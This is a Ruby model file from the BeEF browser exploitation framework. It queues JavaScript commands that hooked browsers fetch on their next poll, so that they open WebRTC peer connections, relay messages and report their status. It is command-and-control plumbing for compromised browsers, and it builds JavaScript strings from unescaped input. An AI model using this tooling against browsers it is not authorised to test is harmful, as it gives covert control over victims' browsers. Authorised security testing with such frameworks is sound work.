#
# Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - https://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
module BeEF
module Core
module Models
  #
  # Table stores the queued up JS commands for managing the client-side webrtc logic.
  #
  class RtcManage < BeEF::Core::Model
  
    # Starts the RTCPeerConnection process, establishing a WebRTC connection between the caller and the receiver
    def self.initiate(caller, receiver, verbosity = false)
      stunservers = BeEF::Core::Configuration.instance.get("beef.extension.webrtc.stunservers")
      turnservers = BeEF::Core::Configuration.instance.get("beef.extension.webrtc.turnservers")

      # Add the beef.webrtc.start() JavaScript call into the RtcManage table - this will be picked up by the browser on next hook.js poll
      # This is for the Receiver
      r = BeEF::Core::Models::RtcManage.new(:hooked_browser_id => receiver, :message => "beef.webrtc.start(0,#{caller},JSON.stringify(#{turnservers}),JSON.stringify(#{stunservers}),#{verbosity});")
      r.save!
      
      # This is the same beef.webrtc.start() JS call, but for the Caller
      r = BeEF::Core::Models::RtcManage.new(:hooked_browser_id => caller, :message => "beef.webrtc.start(1,#{receiver},JSON.stringify(#{turnservers}),JSON.stringify(#{stunservers}),#{verbosity});")
      r.save!
    end

    # Advises a browser to send an RTCDataChannel message to its peer
    # Similar to the initiate method, this loads up a JavaScript call to the beefrtcs[peerid].sendPeerMsg() function call
    def self.sendmsg(from, to, message)
      r = BeEF::Core::Models::RtcManage.new(:hooked_browser_id => from, :message => "beefrtcs[#{to}].sendPeerMsg('#{message}');")
      r.save!
    end

    # Gets the browser to run the beef.webrtc.status() JavaScript function
    # This JS function will return it's values to the /rtcmessage handler
    def self.status(id)
      r = BeEF::Core::Models::RtcManage.new(:hooked_browser_id => id, :message => "beef.webrtc.status(#{id});")
      r.save!
    end

  end
  
end
end
end
